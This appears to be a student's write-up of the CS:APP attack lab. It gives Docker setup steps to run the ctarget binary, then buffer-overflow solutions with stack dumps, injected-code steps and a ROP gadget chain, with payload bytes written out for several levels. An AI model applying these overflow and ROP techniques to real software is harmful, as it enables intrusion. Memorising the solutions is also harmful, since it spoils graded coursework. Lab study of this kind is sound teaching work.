The ./ctarget program checks hostname against the string
`makoshark.ics.cs.cmu.edu` or `whaleshark.ics.cs.cmu.edu` so just set one of
those as the hostname when you run the container:

```
docker run --network=none --hostname=makoshark.ics.cs.cmu.edu -it -v "$PWD:/home/csapp" xieguochao/csapp /bin/bash
```

Also, there is a `changeme.yourschool.edu` host baked into the binary that can
either be patched out or you can just set it in /etc/hosts

```
docker run --network=none --hostname=makoshark.ics.cs.cmu.edu --add-host changeme.yourschool.edu:127.0.0.1 -it -v "$PWD:/home/csapp" xieguochao/csapp /bin/bash
```

You will also need to have a listening server on port 15514 for ./ctarget to
connect to. I provided a basic server that will listen on that port and write to
stdout since nc is not in the container image. It also responds with the HTTP
response ./ctarget expects. You just need to build it outside of the container:

```
CGO_ENABLED=0 go build -o ./server server.go
```

Then run it inside the container:

```
./server &
```

# ctarget - Level 1

test calls getbuf, have getbuf return to touch1

stack state:

```
0x5561dc40:	0x0	0x0
0x5561dc50:	0x0	0x0
0x5561dc60:	0x0	0x0
0x5561dc70:	0x0	0x0 <- rsp
0x5561dc80:	0x0	0x0
0x5561dc90:	0x0	0x55586000
0x5561dca0:	0x401976 <test+14>	0x9
0x5561dcb0:	0x401f24 <launch+112>	0x0
(gdb) p $rsp
$2 = (void *) 0x5561dc78
```

this means we have to write from c78 up to ca0

78-7f (8 bytes)
80-8f (16 bytes)
90-9f (16 bytes)
a0 = c0
a1 = 17
a2 = 40

x4017c0

How to generate bytes:

```
./hex2raw -i c-lvl1.txt | sed -z 's/\n$//' | od -vxaAx
./hex2raw -i c-lvl1.txt | sed -z 's/\n$//' > c-lvl1.bin
```

How to run:

```
./ctarget -i c-lvl1.bin
```

# ctarget - Level 2

The general idea is that I need to:

1. Write a bunch of instructions directly to the stack.
2. Use the overflow exploit to point the return address of the current function
   to the instructions I wrote on the stack.
2. Use the overflow exploit to point the next return address to the touch2
   function.
3. Instructions need to set %rdi and then return to jump to touch2.

stack state:

```
(gdb) p $rsp
$3 = (void *) 0x5561dc78
(gdb) x/7gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000009
(gdb) x/gx touch2
0x4017ec <touch2>:      0x05c7fa8908ec8348
```

1. Write instructions starting at 0x5561dc98.
2. Write 0x5561dc78 as ret address at 0x5561dca0 to call instructions.

```
gcc -c c-lvl2.s
objdump -d c-lvl2.o
```

How to generate bytes:

```
./hex2raw -i c-lvl2.txt | sed -z 's/\n$//' | od -vxaAx
./hex2raw -i c-lvl2.txt | sed -z 's/\n$//' > c-lvl2.bin
```

How to run:

```
./ctarget -i c-lvl2.bin
```

# ctarget - Level 3

1. I need to write the cookie string into the stack somewhere safe, I might need
   to set %rsp to something lower to avoid having the string overwritten by
   future calls
2. Try to reuse the same stack space for ret addresses as before
3. Also still need to set the %rdi registers for the address of the string

# rtarget - Level 2

Objective: Call touch2 with cookie as arg

Game plan:

1. Find gadgets that replicate what you did in the ctarget version
2. Write the addresses for those gadets to the stack in order overwriting the
   return addr

stuff to write to stack:

```
addr for gadget to assign cookie to rdi
cookie: 0x59b997fa
addr for touch2
```

ROP style code to call:

```
popq %rdi # 5f - pop cookie into rdi
ret       # c3 - call touch2
```

Gadgets we have from farm:

00 00 00 c3       - not useful
b8 fb 78 90 90 c3 - not useful
48 89 c7 c3       - movq %rax, %rdi, movl %eax, %edi
51 73 58 90 c3    - popq %rax
89 c7 c7 c3       - not useful
c2 58 92 c3       - not useful
48 8d c7 c3       - not useful
48 89 c7 90 c3    - repeat - movq %rax, %rdi, movl %eax, %edi
b8 29 58 90 c3    - repeat - popq %rax

ROP style code using these gadets:

```
         # 0x004019ab
pop %rax # 58 - pop cookie into rax
nop      # 90 - required nop from gadet
retq     # c3 - ret to next gadget

               # 0x004019a2
mov %rax, %rdi # 48 89 c7 - set first arg to cookie value
retq           # c3 - ret to touch2
```

resolved stack values:

```
0x00000000004019ab # lowest addr
0x0000000059b997fa
0x00000000004019a2
0x00000000004017ec # highest addr
```

payload bytes to write out:

```
00 00 00 00 00 00 00 00 <- og buf
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 <- og ret
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

# rtarget - Level 3

Skip - This doesn't seem too difficult but the handout warned me away from
investing too much time into this.
